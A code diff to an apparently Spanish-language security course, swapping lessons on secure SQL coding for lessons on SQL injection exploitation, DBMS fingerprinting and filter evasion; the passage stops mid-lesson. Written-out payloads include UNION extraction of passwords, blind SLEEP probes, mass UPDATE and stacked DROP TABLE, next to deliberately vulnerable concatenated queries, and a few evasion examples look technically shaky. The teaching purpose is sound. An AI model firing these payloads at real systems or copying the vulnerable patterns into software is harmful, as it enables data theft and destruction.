-        <h2>Ejemplos seguros</h2>
-        <h3>Búsqueda por email parametrizada (sqlite3)</h3>
-        <pre><code class="language-python">conn = sqlite3.connect('miapp.db')
-    email = input("Ingrese su email: ")
-    cursor = conn.execute("SELECT * FROM usuarios WHERE email = ?", (email,))
-    resultados = cursor.fetchall()</code></pre>
-        <p>
-          El marcador <code>?</code> separa datos del SQL; la cadena del usuario se trata como literal seguro.
-        </p>
+<pre><code class="language-html highlight-vulnerable">' OR '1'='1</code></pre>
 
-        <h3>Creación de tabla con validación (Java)</h3>
-        <pre><code class="language-java">String tableName = userInput;
-    if (!tableName.matches("[A-Za-z0-9_]+")) {
-        throw new IllegalArgumentException("Nombre de tabla inválido");
-    }
-    PreparedStatement pst = connection.prepareStatement("CREATE TABLE " + tableName + " (id INT)");
-    pst.executeUpdate();</code></pre>
-        <p>
-          Para identificadores (nombres de tabla/columna) no se usan parámetros; se requiere validación estricta o listas permitidas.
-        </p>
+<p>
+la consulta se transforma en:
+</p>
 
-        <h3>ORMs en acción (SQLAlchemy)</h3>
-        <pre><code class="language-python">user = session.query(User).filter(User.email == email_input).first()</code></pre>
-        <p>El ORM genera una consulta parametrizada subyacente.</p>
+<pre><code class="language-html highlight-vulnerable">SELECT * FROM productos WHERE nombre = '' OR '1'='1'</code></pre>
 
-        <h2>Errores comunes</h2>
-        <ul>
-          <li>Desconocer el funcionamiento del motor y tratar SQL como texto inofensivo.</li>
-          <li>No usar APIs de parametrización disponibles en el lenguaje/plataforma.</li>
-          <li>Confiar en escape manual como solución completa.</li>
-          <li>Olvidar otros canales de entrada (URL, cookies, cabeceras, archivos, servicios).</li>
-          <li>Permitir múltiples sentencias en una llamada (consultas apiladas) sin necesidad.</li>
-        </ul>
+<p>
+La cláusula <code>OR</code> modifica la lógica del filtro y provoca que el motor devuelva todos los registros. En este ejemplo, el atacante no obtiene información específica, pero confirma la vulnerabilidad y demuestra control sobre la consulta.
+</p>
 
-        <h2>Buenas prácticas</h2>
-        <ul>
-          <li>Dominar la API de base de datos del lenguaje: <code>prepare/execute</code>, parámetros, tipos.</li>
-          <li>Usar tipos de datos correctos y validación previa (numéricos sin comillas, rangos, listas blancas).</li>
-          <li>Principio de menor privilegio: cuentas de BD con permisos mínimos necesarios.</li>
-          <li>Cifrar/hashear datos sensibles (p. ej., contraseñas) para reducir impacto ante exposición.</li>
-          <li>Documentar flujos que interactúan con la base de datos para identificar superficies de riesgo.</li>
-        </ul>
+<h3>Uso de comentarios para controlar el resto de la instrucción</h3>
 
-        <h2>Resumen</h2>
-        <p>
-          Se revisaron conceptos fundamentales de SQL y del acceso a datos por aplicaciones: tablas, consultas, envío de SQL a través de drivers
-          y cómo la entrada del usuario se incorpora a las consultas. Al comprender que el motor interpreta cadenas sin conocer la intención,
-          se entiende la base técnica de la <strong>inyección SQL</strong>. También se vio el rol de APIs/ORMs modernos que parametrizan de forma segura.
-        </p>
+<p>
+Los comentarios SQL permiten truncar la consulta desde el punto deseado. Esto es útil cuando la aplicación agrega condiciones adicionales después del parámetro. Si la aplicación construye:
+</p>
+
+<pre><code class="language-html">SELECT * FROM usuarios WHERE usuario = 'valor' AND activo = 1</code></pre>
+
+<p>
+y el atacante envía:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">admin' --</code></pre>
+
+<p>
+la consulta se convierte en:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">SELECT * FROM usuarios WHERE usuario = 'admin' -- ' AND activo = 1</code></pre>
+
+<p>
+El motor ignorará todo lo que sigue a los dos guiones. De esta forma, el atacante elimina verificaciones adicionales como estado del usuario, roles o restricciones internas. El comentario funciona porque el motor no interpreta nada después de él, lo cual modifica completamente la lógica prevista por el desarrollador.
+</p>
+
+<h3>Extracción de datos mediante consultas de unión</h3>
+
+<p>
+La técnica de unión consiste en aprovechar la cláusula <code>UNION</code> para combinar resultados de distintas consultas. Cuando la aplicación muestra los resultados directamente en la interfaz, es posible recuperar datos de otras tablas.
+</p>
+
+<p>
+Supongamos una consulta vulnerable:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">const consulta = "SELECT id, nombre FROM productos WHERE categoria = '" + req.query.categoria + "'";</code></pre>
+
+<p>
+Un parámetro malicioso como:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">electronica' UNION SELECT usuario, contrasena FROM clientes</code></pre>
+
+<p>
+produce la consulta:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">SELECT id, nombre FROM productos WHERE categoria = 'electronica'
+UNION
+SELECT usuario, contrasena FROM clientes</code></pre>
+
+<p>
+La aplicación mostrará los valores devueltos por la segunda consulta, lo cual es crítico cuando el resultado contiene información confidencial. Esta técnica funciona porque <code>UNION</code> requiere el mismo número de columnas y tipos compatibles, lo que permite manipular los datos mostrados en pantalla sin alterar la estructura global.
+</p>
+
+<h3>Enumeración de columnas mediante condiciones manipuladas</h3>
+
+<p>
+En etapas iniciales de una auditoría, el atacante intenta determinar cuántas columnas devuelve la consulta. Para ello se manipula el parámetro usando una serie de intentos lógicos. Sin mencionar herramientas de explotación, un ejemplo conceptual sería:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">' ORDER BY 3 --</code></pre>
+
+<p>
+Si la tabla tiene solo dos columnas, la consulta:
+</p>
+
+<pre><code class="language-html">SELECT id, nombre FROM productos ORDER BY 3 --</code></pre>
+
+<p>
+generará un error indicando que la tercera columna no existe. Esta respuesta revela la estructura básica de la tabla. La técnica funciona porque <code>ORDER BY</code> requiere una columna válida, por lo que cualquier número fuera de rango produce un mensaje que confirma el límite real.
+</p>
+
+<h3>Explotación basada en booleanos para extraer información</h3>
+
+<p>
+Cuando la aplicación no muestra errores ni devuelve datos visibles, la técnica consiste en manipular la lógica y observar si el comportamiento cambia. El parámetro <code>id</code> de un detalle de producto podría verse así:
+</p>
+
+<pre><code class="language-html">/detalle?id=5</code></pre>
+
+<p>
+El atacante, prueba:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">/detalle?id=5 AND 1=1</code></pre>
+
+<p>
+y luego:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">/detalle?id=5 AND 1=2</code></pre>
+
+<p>
+Si la primera devuelve el producto correctamente y la segunda genera una página vacía, esto indica que el motor está evaluando la condición dentro de la consulta. A partir de aquí, es posible extraer información binaria, por ejemplo, comprobando si el primer carácter del usuario administrador es mayor que cierto valor <code>ASCII</code>.
+</p>
+
+<p>
+La técnica funciona porque permite extraer datos sin necesidad de que la base de datos los muestre directamente, utilizando diferencias en la respuesta como canal de información.
+</p>
+
+<h3>Explotación basada en tiempo para confirmar condiciones</h3>
+
+<p>
+Cuando ni los errores ni el contenido difieren, algunos motores permiten funciones que producen demoras. El comportamiento del servidor revela si la condición es verdadera.
+</p>
+
+<p>
+Un parámetro como:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">id=10 AND SLEEP(4)</code></pre>
+
+<p>
+en un motor compatible produce una pausa en la respuesta. Si la aplicación tarda notablemente más en cargar la página, el atacante confirma la ejecución del código. Con variaciones de esta técnica, es posible extraer caracteres, longitudes o valores internos.
+</p>
+
+<p>
+Este método es útil en entornos restrictivos porque no depende de mensajes de error ni de cambios visibles.
+</p>
+
+<h3>Manipulación de datos mediante inyecciones de actualización</h3>
+
+<p>
+La inyección SQL no solo sirve para leer datos. Cuando la consulta vulnerable corresponde a operaciones de actualización, un atacante puede modificar registros.
+</p>
+
+<p>
+Un ejemplo inseguro podría ser:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">const consulta = "UPDATE usuarios SET correo = '" + req.body.correo +
+                 "' WHERE id = " + req.body.id;</code></pre>
+
+<p>
+Un atacante enviaría como valor de id:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">5 OR 1=1</code></pre>
+
+<p>
+Lo cual genera:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">UPDATE usuarios SET correo = 'nuevo@correo.com' WHERE id = 5 OR 1=1</code></pre>
+
+<p>
+El motor actualizará todos los registros, no solo uno, debido a que la condición siempre se cumple. La lógica de modificación cambia por completo, lo que demuestra cómo una operación aparentemente trivial puede causar daños de gran alcance en la integridad de la base de datos.
+</p>
+
+<h3>Eliminación de tablas mediante consultas inseguras</h3>
+
+<p>
+En bases de datos que ejecutan múltiples instrucciones por consulta, un campo vulnerable podría permitir la ejecución de comandos destructivos. Este ejemplo no utiliza casos reales, sino un patrón técnico:
+</p>
+
+<p>
+Entrada insegura:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">nombre=prueba'; DROP TABLE logs; --</code></pre>
+
+<p>
+Consulta final:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">SELECT * FROM logs WHERE nombre = 'prueba'; DROP TABLE logs; --</code></pre>
+
+<p>
+El motor ejecutará ambas sentencias en orden si el gestor lo permite. Esto muestra cómo una inyección simple puede transformarse en un impacto severo sobre la disponibilidad del sistema. La técnica funciona porque la aplicación no valida el contenido y el motor no distingue entre el SQL legítimo y el malicioso cuando ambos aparecen en la misma instrucción.
+</p>
+
+<h3>Bibliografía</h3>
+<ul>
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+
+  <li>
+    PortSwigger, SQL Injection Cheatsheet, [Online]. Available:
+    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
+      https://portswigger.net/web-security/sql-injection
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, 2nd ed., Microsoft Press, 2003.
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
+  </li>
+</ul>
       `
     },
-    'raices-sqli': {
-      id: 'raices-sqli',
-      title: '¿Por qué ocurren las inyecciones SQL?',
-      description: 'Explora las causas comunes: concatenación de cadenas, falta de validación, uso indebido de APIs y su relación con decisiones de diseño inseguras.',
+    'fingerprinting-dbms': {
+      id: 'fingerprinting-dbms',
+      title: 'Reconocimiento y fingerprinting de bases de datos (DBMS)',
+      description: '¿Cómo identificar el tipo y versión de servidor en ataques de inyección SQL?',
       category: 'sqli',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          Tras comprender qué es la inyección SQL y cómo se explota, es esencial analizar sus causas raíz desde la perspectiva del desarrollo y del ciclo de vida del software.
-          En este módulo identificamos las razones por las que aparecen estas vulnerabilidades: errores de programación, malas prácticas, supuestos incorrectos y condiciones ambientales que facilitan su aparición.
-          Cubriremos factores humanos, técnicos y organizativos que con frecuencia conducen a que la inyección SQL permanezca en aplicaciones en producción.
-        </p>
+Durante una evaluación de seguridad enfocada en inyección SQL, uno de los objetivos principales consiste en identificar el tipo exacto de Sistema Gestor de Base de Datos (DBMS) que utiliza la aplicación. Cada motor incorpora funciones específicas, estructuras internas y sintaxis distintivas. Por esa razón, conocer el DBMS permite comprender qué técnicas de explotación podrían o no funcionar, qué funciones están disponibles y qué posibilidades tiene un atacante para extraer información.
+</p>
 
-        <h2>Explicación general</h2>
+<p>
+El fingerprinting de bases de datos se basa en observar diferencias en el comportamiento de la aplicación cuando se inyectan valores cuidadosamente diseñados. Incluso cuando no se revelan errores visibles, cada motor reacciona de manera particular ante ciertas expresiones, operadores, funciones internas y formatos. Esta lección explica las técnicas más empleadas para reconocer el DBMS detrás de una aplicación vulnerable.
+</p>
+
+<h3>Reconocimiento mediante funciones internas</h3>
+
+<p>
+Los motores de bases de datos exponen funciones integradas que no suelen existir en otros sistemas. Aprovechar estas funciones permite identificar el motor de forma precisa. Para ello, durante una auditoría se observa cómo reacciona la aplicación cuando la consulta contiene funciones disponibles solo en un motor específico.
+</p>
+
+<p>
+Si se trabaja con una aplicación vulnerable que contiene una consulta como:
+</p>
+
+<pre><code class="language-html">const consulta = "SELECT * FROM productos WHERE id = " + req.query.id;</code></pre>
+
+<p>
+un auditor puede enviar un parámetro que incorpore una función característica. Por ejemplo:
+</p>
+
+<pre><code class="language-html">1 AND VERSION()</code></pre>
+
+<p>
+En MySQL, <code>VERSION()</code> es una función válida que devuelve la versión del motor. Si la aplicación muestra errores o contenido diferente ante esta expresión, se puede inferir que el motor reconoce la función.
+</p>
+
+<p>
+Otros motores utilizan funciones distintas. <i><b>SQL Server</b></i> tiene <code>@@version</code>, <i><b>Oracle</b></i> dispone de funciones como <code>banner</code> y <i><b>PostgreSQL</b></i> posee funciones como <code>current_setting</code>. El análisis de la respuesta permite distinguir cuál de ellas está siendo ejecutada, dado que cada motor interpreta o rechaza la función de forma distinta.
+</p>
+
+<p>
+Esta técnica se basa en el principio de que la sintaxis interna del DBMS rara vez coincide entre sistemas diferentes, y su aceptación o rechazo constituye un indicador fiable sobre el motor.
+</p>
+
+<h3>Identificación mediante concatenación de cadenas</h3>
+
+<p>
+Cada motor usa operadores diferentes para concatenar texto. Observar cómo reacciona la consulta ante una concatenación específica permite descubrir el DBMS subyacente.
+</p>
+
+<p>
+Suponga que un auditor manipula el parámetro <code>id</code> en:
+</p>
+
+<pre><code class="language-html">/producto?id=10</code></pre>
+
+<p>
+y lo reemplaza por:
+</p>
+
+<pre><code class="language-html">10 AND 'A' || 'B'</code></pre>
+
+<p>
+El operador <code>||</code> es válido en <i><b>PostgreSQL</b></i> y <i><b>Oracle</b></i>, pero no en <i><b>MySQL</b></i> ni <i><b>SQL Server</b></i>. Si la aplicación responde sin error, se puede deducir que se está frente a uno de los motores que aceptan ese operador.
+</p>
+
+<p>
+Otro ejemplo es:
+</p>
+
+<pre><code class="language-html">10 AND 'A' + 'B'</code></pre>
+
+<p>
+Este operador es característico de <i><b>SQL Server</b></i>. Si la aplicación lo interpreta correctamente, se puede inferir que el backend utiliza ese motor.
+</p>
+
+<p>
+Las diferencias entre operadores de concatenación permiten identificar el motor sin necesidad de mensajes de error explícitos.
+</p>
+
+<h3>Fingerprinting mediante diferencias en funciones matemáticas o condicionales</h3>
+
+<p>
+Las funciones matemáticas básicas o las construcciones condicionales también difieren entre motores. Algunas funciones existen en <i><b>MySQL</b></i> y no en <i><b>SQL Server</b></i>, o tienen nombres distintos en <i><b>Oracle</b></i>.
+</p>
+
+<p>
+Un auditor puede construir un parámetro como:
+</p>
+
+<pre><code class="language-html">10 AND IF(1=1, 1, 0)</code></pre>
+
+<p>
+<code>IF</code> es válido en <i><b>MySQL</b></i>, pero <i><b>SQL Server</b></i> utiliza <code>IIF</code> y <i><b>Oracle</b></i> emplea <code>DECODE</code> o <code>CASE</code>. Si la aplicación devuelve contenido modificado según la expresión, se confirma la ejecución de la función interna y por lo tanto el motor compatible con ella.
+</p>
+
+<p>
+Otra variación sería:
+</p>
+
+<pre><code class="language-html">10 AND CASE WHEN 1=1 THEN 1 ELSE 0 END</code></pre>
+
+<p>
+<code>CASE WHEN</code> es compatible con prácticamente todos los motores modernos, pero ciertas particularidades en la sintaxis o en los mensajes de error pueden revelar el motor específico.
+</p>
+
+<p>
+Estas diferencias son pequeñas desde la perspectiva del SQL estándar, pero suficientes para deducir el motor real.
+</p>
+
+<h3>Reconocimiento basado en diferencias de comentarios</h3>
+
+<p>
+Los comentarios <code>SQL</code> permiten detectar motores desde la capa superficial de la sintaxis. Según la base de datos, se admiten formatos distintos.
+</p>
+
+<p>
+Una aplicación que responda correctamente a:
+</p>
+
+<pre><code class="language-html">10 -- prueba</code></pre>
+
+<p>
+indica compatibilidad con <i><b>MySQL</b></i>, <i><b>PostgreSQL</b></i> o <i><b>SQL Server</b></i>, ya que aceptan el comentario con doble guión. Si en cambio el motor solo acepta comentarios con <code>/* */</code> como <i><b>Oracle</b></i> en ciertos contextos, una expresión como:
+</p>
+
+<pre><code class="language-html">10 /* comentario */</code></pre>
+
+<p>
+puede ser interpretada correctamente en <i><b>Oracle</b></i> pero no en otros motores. La reacción del motor ante uno u otro formato sirve como indicador del DBMS subyacente.
+</p>
+
+<h3>Identificación mediante la cláusula LIMIT y alternativas</h3>
+
+<p>
+La forma en que cada DBMS limita el número de filas es un indicador claro del motor utilizado. Un auditor puede manipular el parámetro vulnerable y observar cómo se comporta la consulta.
+</p>
+
+<p>
+<i><b>MySQL</b></i> y <i><b>PostgreSQL</b></i> aceptan:
+</p>
+
+<pre><code class="language-html">LIMIT 1</code></pre>
+
+<p>
+<i><b>SQL Server</b></i> utiliza:
+</p>
+
+<pre><code class="language-html">SELECT TOP 1</code></pre>
+
+<p>
+<i><b>Oracle</b></i> emplea construcciones como:
+</p>
+
+<pre><code class="language-html">ROWNUM = 1</code></pre>
+
+<p>
+Si se introduce un parámetro como:
+</p>
+
+<pre><code class="language-html">10 LIMIT 1</code></pre>
+
+<p>
+y el motor no produce error o responde de forma distinta, esto indica compatibilidad con un sistema específico. Esta técnica se basa en que la restricción de filas es distinta entre motores y difícilmente pasa desapercibida en un ataque controlado.
+</p>
+
+<h3>Fingerprinting basado en tipos de error</h3>
+<div class="warning-box">
+<p>
+Incluso cuando las aplicaciones no muestran mensajes de error completos, ciertos fragmentos revelan pistas del motor, como:
+</p>
+
+<ul>
+  <li>Mensajes parciales que contienen nombres de funciones internas.</li>
+  <li>Tipos de excepciones específicas del motor.</li>
+  <li>Frases características del parser SQL.</li>
+</ul>
+</div>
+<p>
+Un ejemplo clásico sería el texto <code>"You have an error in your SQL syntax"</code> que es propio de <i><b>MySQL</b></i>. <i><b>SQL Server</b></i> utiliza expresiones como <code>"Incorrect syntax near"</code>, y <i><b>Oracle</b></i> presenta mensajes más extensos que incluyen referencias a su parser interno.
+</p>
+
+<p>
+Aunque los mensajes estén truncados, las diferencias en la redacción y el estilo de los errores permiten deducir el motor utilizado.
+</p>
+
+<h3>Reconocimiento mediante canales indirectos</h3>
+<div class="warning-box">
+<p>
+En algunos casos, el motor no revela errores ni reacciona de forma evidente ante funciones desconocidas. Sin embargo, ciertos comportamientos sutiles permiten distinguir el sistema. Entre ellos:
+</p>
+
+<ul>
+  <li>Diferencias en tiempos de ejecución de funciones.</li>
+  <li>Variaciones en la forma de interpretar espacios o caracteres especiales.</li>
+  <li>Orden de evaluación de condiciones lógicas.</li>
+  <li>Reacciones específicas ante consultas incompletas.</li>
+</ul>
+</div>
+<p>
+Incluso detalles como el manejo de valores nulos, o la forma en que el motor compara cadenas y números, pueden servir para deducir el sistema gestor.
+</p>
+
+<p>
+Estas técnicas se utilizan en auditorías avanzadas cuando la superficie visible es mínima y la aplicación no muestra información interna.
+</p>
+
+<h3>Bibliografía</h3>
+<ul>
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    PortSwigger, SQL Injection Fingerprinting, [Online]. Available:
+    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
+      https://portswigger.net/web-security/sql-injection
+    </a>
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
+  </li>
+</ul>
+      `
+    },
+    'evasion-sqli': {
+      id: 'evasion-sqli',
+      title: 'Técnicas avanzadas de evasión y manipulación',
+      description: 'Métodos para saltar filtros y controles tradicionales en SQLi.',
+      category: 'sqli',
+      htmlContent: `
         <p>
-          La causa fundamental es la mezcla de datos y código: si los valores proporcionados por usuarios se interpolan dentro de una instrucción SQL sin separación clara, un atacante puede manipular la sintaxis y alterar el comportamiento de la consulta.
-          Técnicamente, esto es una falta de neutralización de caracteres especiales en comandos SQL (CWE-89). El servidor de base de datos no distingue la "intención" del programador; ejecuta lo que recibe si es sintácticamente válido.
-        </p>
+Cuando las aplicaciones implementan filtros básicos para bloquear cadenas sospechosas, como comillas o palabras clave, los atacantes emplean técnicas más avanzadas para reconstruir consultas SQL válidas y evadir los controles. Estas técnicas buscan aprovechar características internas del motor de base de datos, el comportamiento del analizador SQL y la forma en que la aplicación limpia o normaliza la entrada. A diferencia de las técnicas simples, estas estrategias se enfocan en manipular la consulta sin depender necesariamente de palabras clave obvias, fragmentos completos de SQL o patrones que un filtro superficial pueda detectar.
+</p>
 
-        <h2>Causas principales</h2>
+<p>
+En esta lección se explican estrategias avanzadas utilizadas en auditorías y ataques, poniendo énfasis en su funcionamiento técnico y en lo que sucede internamente dentro del motor de base de datos. Se analizan técnicas como la ofuscación de payloads, el uso de codificación alternativa, la manipulación de operadores y la reconstrucción de expresiones, destacando la lógica detrás de cada mecanismo.
+</p>
 
-        <h3>1. Mezcla de datos y código</h3>
-        <p>
-          Construir consultas mediante concatenación de strings coloca datos del usuario directamente en el contexto de ejecución. Un simple <code>'</code> puede cerrar una cadena y permitir que el resto de la entrada se interprete como código SQL.
-          La separación adecuada entre código y datos (mediante parámetros/prepared statements) evita esta causa raíz.
-        </p>
+<h3>Evasión mediante codificación y transformaciones de caracteres</h3>
 
-        <h3>2. Validación inadecuada o inexistente</h3>
-        <p>
-          La ausencia de validación del lado servidor permite que entradas inesperadas lleguen sin control a la capa de datos. Validaciones correctas por tipo, longitud y formato reducen la superficie de ataque, aunque no sustituyen la parametrización.
-        </p>
+<p>
+Algunos filtros verifican la presencia de palabras clave como <code>SELECT</code>, <code>UNION</code> o <code>DROP</code>. Sin embargo, varios motores permiten que las palabras clave se escriban en mayúsculas, minúsculas o combinaciones. Esto significa que expresiones como <code>select</code>, <code>SeLeCt</code> o <code>SELECT</code> son equivalentes. Si un filtro solo busca la forma exacta <code>SELECT</code>, una variante modificada permite evadir la restricción.
+</p>
 
-        <h3>3. Uso de métodos inseguros por conveniencia</h3>
-        <p>
-          Es frecuente que, por rapidez o simplicidad, se elija concatenar una línea en vez de implementar una sentencia preparada. Esta "ruta rápida" deja deuda técnica que puede llegar a producción y convertirse en vulnerabilidad.
-        </p>
+<p>
+Además, algunos motores aceptan codificaciones alternativas dentro de las cadenas. Por ejemplo, caracteres como comillas o espacios pueden representarse en formato hexadecimal. Un texto como:
+</p>
 
-        <h3>4. Falta de conocimiento o capacitación</h3>
-        <p>
-          Muchos desarrolladores no reciben formación específica en seguridad. Ejemplos inseguros en tutoriales o código heredado reproducen malos patrones. La ignorancia técnica es una causa directa de inyección SQL.
-        </p>
+<pre><code class="language-html">0x73656C656374</code></pre>
 
-        <h3>5. Supuestos erróneos sobre el entorno</h3>
-        <p>
-          Creer que un parámetro no puede ser manipulado (URL, cookie, campo oculto) o que una aplicación "interna" es segura conduce a relajaciones en controles. Toda entrada debe considerarse no confiable.
-        </p>
+<p>
+representa la palabra <code>select</code>. Cuando el motor interpreta este valor, lo decodifica en tiempo de ejecución. Si el filtro solo busca palabras en texto plano, esta técnica permite reconstruir la instrucción dentro del motor sin que se detecte la palabra clave original.
+</p>
 
-        <h3>6. Reutilización de código inseguro y deuda técnica</h3>
-        <p>
-          Copiar/pegar fragmentos inseguros desde ejemplos o mantener código legacy sin auditoría propaga vulnerabilidades. Sistemas antiguos o librerías desactualizadas pueden no ofrecer mecanismos seguros por defecto.
-        </p>
+<p>
+Internamente, el motor analiza la cadena decodificada y la interpreta como SQL. La evasión funciona porque la aplicación valida la entrada en su representación original y no en la forma final que usa el motor.
+</p>
 
-        <h3>7. Complejidad funcional y diseño inadecuado</h3>
-        <p>
-          Requisitos que exigen SQL dinámico (filtros arbitrarios, ordenamientos por columnas proporcionadas por el usuario, generación dinámica de columnas) complican la implementación segura. Si no se modelan correctamente (listas blancas, query builders seguros), se recurre a concatenación y aparece la vulnerabilidad.
-        </p>
+<h3>Uso de operadores alternativos para reconstruir condiciones</h3>
 
-        <h3>8. APIs y frameworks inseguros u obsoletos</h3>
-        <p>
-          Entornos antiguos o drivers sin soporte para parámetros incitan a prácticas inseguras. No actualizar dependencias o usar librerías con fallos conocidos incrementa el riesgo.
-        </p>
+<p>
+Los filtros pueden buscar operadores como <code>OR</code> o <code>AND</code>, pero los motores de base de datos suelen proporcionar sinónimos o equivalencias. Por ejemplo, algunas variantes permiten usar el operador doble barra vertical, o funciones internas que actúan como equivalentes lógicos.
+</p>
 
-        <h3>9. Falta de pruebas, revisión y monitoreo</h3>
-        <p>
-          Ausencia de code review enfocado en seguridad, pruebas dinámicas (DAST) y análisis estático (SAST) permite que vulnerabilidades lleguen a producción sin ser detectadas. Tampoco investigar logs anómalos facilita que un atacante pruebe cargas maliciosas sin ser detectado.
-        </p>
+<p>
+Considere una aplicación que bloquea <code>OR</code>. Un atacante puede intentar reconstruir la lógica mediante una expresión como:
+</p>
 
-        <h2>Escenarios ilustrativos</h2>
+<pre><code class="language-html">'||' = '|''</code></pre>
 
-        <h3>Escenario A — Código tomado de un tutorial</h3>
-        <pre><code class="language-php">$sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";</code></pre>
-        <p>Falla: el desarrollador copia un ejemplo inseguro sin comprender riesgos. Causa: falta de conocimiento y ejemplos públicos inseguros.</p>
+<p>
+o mediante funciones como:
+</p>
 
-        <h3>Escenario B — Confianza en un entorno interno</h3>
-        <p>
-          Una app interna permite al usuario escribir una cláusula WHERE completa para flexibilidad. Un empleado malintencionado inserta <code>1=1; DROP TABLE ventas;--</code> y la ejecución borra datos.
-          Falla: supuestos de confianza y permisos excesivos en la cuenta de BD.
-        </p>
+<pre><code class="language-html">COALESCE(1, 1)</code></pre>
 
-        <h3>Escenario C — Complejidad técnica</h3>
-        <p>
-          Se construye dinámicamente el ORDER BY según un parámetro de usuario. La lista blanca contiene un bug y permite inyectar payload en el ORDER BY.
-          Falla: diseño que no contempla mapas seguros para identificadores dinámicos.
-        </p>
+<p>
+que siempre devuelven un valor verdadero. La idea consiste en crear un comportamiento equivalente sin utilizar palabras clave supervisadas. La consulta final puede mantener su estructura, pero internamente el motor evaluará la expresión como verdadera, permitiendo manipular el resultado.
+</p>
 
-        <h3>Escenario D — Código legado</h3>
-        <pre><code class="language-vb">sql = "SELECT * FROM Clientes WHERE apellido = '" & request("apellido") & "'"</code></pre>
-        <p>Falla: código antiguo sin auditoría; la vulnerabilidad persiste por años.</p>
+<p>
+Esta técnica se basa en que el motor evalúa expresiones lógicas durante la ejecución y no requiere necesariamente operadores tradicionales.
+</p>
 
-        <h2>Errores conceptuales frecuentes</h2>
-        <ul>
-          <li>Culpar al usuario por enviar entradas maliciosas en vez de corregir el código.</li>
-          <li>Tratar la seguridad como un añadido tardío en lugar de integrarla en el diseño.</li>
-          <li>No actualizar frameworks o librerías que corrigen fallos de seguridad.</li>
-          <li>Confiar exclusivamente en mitigaciones parciales (WAF, stored procedures) en lugar de asegurar el código.</li>
-          <li>Ignorar señales en logs o patrones inusuales de consultas que pueden indicar pruebas de inyección.</li>
-        </ul>
+<h3>Evasión mediante fragmentación de palabras clave</h3>
 
-        <h2>Medidas para abordar las causas</h2>
-        <ul>
-          <li>Políticas y guías de codificación: prohibir concatenaciones de entrada en SQL; exigir prepared statements.</li>
-          <li>Formación continua: cursos prácticos, ejemplos seguros en plantillas internas y revisiones de pares con foco en seguridad.</li>
-          <li>Integración de herramientas en el pipeline: SAST en cada build, DAST en entornos de prueba y reglas de linting que detecten concatenaciones peligrosas.</li>
-          <li>Principio de menor privilegio: cuentas de BD con permisos mínimos; deshabilitar funciones peligrosas si no son necesarias.</li>
-          <li>Diseño seguro para requisitos complejos: usar query builders, mapas de columnas permitidas y plantillas predefinidas en lugar de SQL libre.</li>
-          <li>Gestión de deuda técnica y refactorización periódica: auditar código legacy y reemplazar patrones inseguros por implementaciones seguras.</li>
-          <li>Monitoreo activo: analizar logs y establecer alertas para patrones repetitivos (intentos con <code>OR 1=1</code>, <code>UNION</code>, <code>SLEEP</code>, etc.).</li>
-          <li>Entornos separables y datos no reales en dev: minimizar impacto si se explota un entorno de desarrollo/test.</li>
-        </ul>
+<p>
+Los filtros que buscan cadenas completas pueden ser evadidos si la cadena se divide en segmentos que luego el servidor recompone como una única palabra clave. Algunos motores permiten concatenar cadenas mediante símbolos internos.
+</p>
 
-        <h2>Resumen</h2>
-        <p>
-          Las inyecciones SQL surgen por decisiones y fallos concretos: mezclar datos y código, validar mal la entrada, usar APIs inseguras, asumptos erróneos y falta de pruebas o mantenimiento.
-          Atacar estas causas raíz requiere educación, prácticas de codificación seguras, revisión continua y controles operativos (privilegios mínimos, monitoreo, actualizaciones).
-          Incorporando estas medidas en el ciclo de desarrollo se elimina la mayoría de los vectores que permiten la inyección SQL.
-        </p>
+<p>
+Una entrada como:
+</p>
+
+<pre><code class="language-html">UNI'||'ON SELECT</code></pre>
+
+<p>
+puede reconstruirse como <code>UNION SELECT</code> dentro del motor. Si el filtro solo busca la palabra <code>UNION</code> como un bloque completo, no detectará la expresión dividida.
+</p>
+
+<p>
+El motor identifica que ambas partes forman una única cadena válida y la interpreta como una instrucción. La aplicación ve la entrada dividida, pero la base de datos la procesa en su forma final.
+</p>
+
+<h3>Uso de comentarios para interrumpir filtros rígidos</h3>
+
+<p>
+Los comentarios permiten insertar interrupciones dentro de palabras clave, evitando su detección cuando el filtro evalúa la entrada como texto plano.
+</p>
+
+<p>
+En <code>SQL</code>, los comentarios pueden insertarse así:
+</p>
+
+<pre><code class="language-html">UN/**/ION SELECT</code></pre>
+
+<p>
